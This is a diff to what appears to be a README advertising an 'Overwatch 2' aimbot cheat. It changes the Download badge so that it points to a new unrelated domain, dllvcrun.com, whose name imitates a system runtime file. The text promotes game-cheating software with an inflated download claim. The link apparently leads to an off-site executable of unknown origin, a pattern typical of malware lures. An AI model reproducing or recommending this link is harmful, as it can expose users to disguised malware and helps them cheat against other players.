@@ -49,7 +49,7 @@ A: Yes — tracks enemy ultimate charge percentage.
 
 **Monthly downloads:** 1.8m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/ow2aimbot26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/ow2aimbot26)
 
 ---
 
